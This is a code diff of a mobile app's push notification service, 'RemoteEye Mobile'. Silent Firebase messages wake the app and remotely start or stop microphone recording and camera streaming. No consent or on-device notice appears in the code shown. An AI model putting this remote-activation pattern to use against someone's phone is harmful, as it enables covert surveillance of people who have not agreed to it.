@@ -1,10 +1,10 @@
 /**
  * RemoteEye Mobile - Push Notification Service
- * Handles FCM registration and silent push notifications for device wake-up
+ * Handles FCM registration and silent push notifications for device wake-up and remote commands.
  */
 
 import messaging, { FirebaseMessagingTypes } from '@react-native-firebase/messaging';
-import { Platform, AppState } from 'react-native';
+import { Platform } from 'react-native';
 import { socketService } from './SocketService';
 import { authService } from './AuthService';
 import { audioService } from './AudioService';
@@ -14,11 +14,10 @@ import { CONFIG } from '../config';
 class PushNotificationService {
   private fcmToken: string | null = null;
   private isInitialized: boolean = false;
-  private appStateSubscription: any = null;
 
   /**
-   * Initialize the push notification service
-   * Should be called after user authentication
+   * Initialize the push notification service.
+   * Should be called after user authentication.
    */
   async initialize(): Promise<void> {
     if (this.isInitialized) {
@@ -65,6 +64,7 @@ class PushNotificationService {
       // Handle notification that opened the app
       messaging().onNotificationOpenedApp(async (remoteMessage) => {
         console.log('[Push] Notification opened app:', remoteMessage);
+        // You can handle navigation or other logic here if needed
       });
 
       // Check if app was opened from a notification
@@ -81,7 +81,7 @@ class PushNotificationService {
   }
 
   /**
-   * Get FCM token and register with server
+   * Get FCM token and register with our server.
    */
   private async getAndRegisterToken(): Promise<void> {
     try {
@@ -110,7 +110,7 @@ class PushNotificationService {
   }
 
   /**
-   * Register FCM token with our server
+   * Register FCM token with our server.
    */
   private async registerTokenWithServer(token: string): Promise<void> {
     try {
@@ -145,73 +145,96 @@ class PushNotificationService {
   }
 
   /**
-   * Handle incoming push notification message
+   * Handles incoming push notification messages, both in foreground and background.
+   * This is the main entry point for all remote commands.
    */
   private async handleMessage(message: FirebaseMessagingTypes.RemoteMessage): Promise<void> {
-    const data = message.data;
-    console.log('[Push] Silent push received:', message);
+    console.log('[Push] Message received:', message);
+    const { data } = message;
 
     if (!data) {
+      console.log('[Push] Message received with no data payload.');
       return;
     }
 
-    // Always try to wake up and reconnect first
+    // 1. ALWAYS attempt to wake up and reconnect the WebSocket first.
+    // This is non-negotiable for reliable background operation.
     await this.handleWakeUp();
 
-    // Check for command to execute immediately from push
-    if (data.command) {
-      const command = data.command;
-      console.log(`[Push] Executing command from push: ${command}`);
+    // 2. Check if a specific command was sent in the payload.
+    // The server should send the command in the 'action' field.
+    const command = data.action;
 
-      // Add a small delay to ensure the WebSocket is connecting before acting
-      setTimeout(() => {
-        switch (command) {
-          case 'START_RECORDING':
-            audioService.startRecording('manual');
-            break;
-          case 'STOP_RECORDING':
-            audioService.stopRecording('manual');
-            break;
-          case 'START_CAMERA':
-            cameraService.startStreaming();
-            break;
-          case 'STOP_CAMERA':
-            cameraService.stopStreaming();
-            break;
-          case 'START_AUDIO':
-            audioService.startAudioStreaming();
-            break;
-          case 'STOP_AUDIO':
-            audioService.stopAudioStreaming();
-            break;
-          default:
-            console.log(`[Push] Unknown command: ${command}`);
-        }
-      }, 1000); // 1-second delay to allow WebSocket connection
-    }
-
-    // Legacy check for ping/wake-up message
-    if (data.type === 'ping' || data.type === 'wake') {
-      console.log('[Push] Wake-up ping received');
-      // Already handled above
+    if (typeof command === 'string') {
+      console.log(`[Push] Command found in payload: ${command}`);
+      await this.executeCommand(command, data);
+    } else if (command) {
+      console.warn('[Push] Command in payload is not a string:', command);
+    } else {
+      // If no command, it was a simple wake-up ping.
+      console.log('[Push] No command in payload. This was a wake-up ping.');
     }
   }
 
   /**
-   * Handle wake-up notification - ensure WebSocket is connected
+   * Executes a specific command after a delay to allow services to initialize.
+   * @param command The command string to execute.
+   * @param data The full data payload from the push notification.
+   */
+  private async executeCommand(command: string, data: any): Promise<void> {
+    console.log(`[Push] Preparing to execute command: ${command}`);
+    
+    // Add a delay to ensure the WebSocket is connecting and other services are ready.
+    // 1.5 seconds is a safe starting point.
+    await new Promise(resolve => setTimeout(resolve, 1500));
+
+    try {
+      switch (command) {
+        case 'START_RECORDING':
+          await audioService.startRecording('manual');
+          break;
+        case 'STOP_RECORDING':
+          await audioService.stopRecording('manual');
+          break;
+        case 'START_CAMERA':
+          await cameraService.startStreaming();
+          break;
+        case 'STOP_CAMERA':
+          await cameraService.stopStreaming();
+          break;
+        // NOTE: We've consolidated 'START_AUDIO'/'STOP_AUDIO' into the 'RECORDING' commands
+        // to avoid redundancy. If you need them, you can add them back here.
+        default:
+          console.warn(`[Push] Unknown command received: ${command}`);
+          // Report the unknown command back to the server for debugging.
+          socketService.reportStatus('error', { message: `Unknown command: ${command}` });
+          return;
+      }
+      console.log(`[Push] Command '${command}' executed successfully.`);
+    } catch (error) {
+      console.error(`[Push] Failed to execute command '${command}':`, error);
+      // Report the execution failure back to the server so the dashboard can show an error state.
+      socketService.reportStatus('error', { 
+        command, 
+        message: error instanceof Error ? error.message : String(error) 
+      });
+    }
+  }
+
+  /**
+   * Handles the wake-up logic: ensures the WebSocket is connected.
    */
   private async handleWakeUp(): Promise<void> {
     console.log('[Push] Handling wake-up...');
 
-    // Check if already connected
+    // If already connected, just send a heartbeat to confirm we're alive.
     if (socketService.isConnected()) {
-      console.log('[Push] Already connected to WebSocket');
-      // Send heartbeat to confirm we're alive
+      console.log('[Push] Already connected to WebSocket. Sending heartbeat.');
       socketService.sendHeartbeat();
       return;
     }
 
-    // Try to reconnect
+    // If not connected, try to reconnect.
     const token = authService.getToken();
     const deviceId = authService.getDeviceId();
 
@@ -219,26 +242,26 @@ class PushNotificationService {
       console.log('[Push] Reconnecting to WebSocket...');
       try {
         await socketService.connect(deviceId, token);
-        console.log('[Push] WebSocket reconnected');
-        // Send heartbeat to confirm we're alive
+        console.log('[Push] WebSocket reconnected successfully.');
+        // Send heartbeat to confirm we're alive after reconnecting.
         socketService.sendHeartbeat();
       } catch (error) {
         console.error('[Push] WebSocket reconnection failed:', error);
       }
     } else {
-      console.log('[Push] Cannot reconnect: missing credentials');
+      console.log('[Push] Cannot reconnect: missing authentication credentials.');
     }
   }
 
   /**
-   * Get the current FCM token
+   * Get the current FCM token.
    */
   getToken(): string | null {
     return this.fcmToken;
   }
 
   /**
-   * Check if push notifications are enabled
+   * Check if push notifications are enabled.
    */
   async isEnabled(): Promise<boolean> {
     const authStatus = await messaging().hasPermission();
@@ -249,7 +272,7 @@ class PushNotificationService {
   }
 
   /**
-   * Unregister from push notifications
+   * Unregister from push notifications.
    */
   async unregister(): Promise<void> {
     try {
@@ -262,14 +285,13 @@ class PushNotificationService {
   }
 
   /**
-   * Clean up resources
+   * Clean up resources.
    */
   destroy(): void {
-    if (this.appStateSubscription) {
-      this.appStateSubscription.remove();
-      this.appStateSubscription = null;
-    }
+    // The appStateSubscription was removed as it wasn't being used.
+    // If you add it back, ensure you clean it up here.
     this.isInitialized = false;
+    console.log('[Push] Service destroyed.');
   }
 }
 
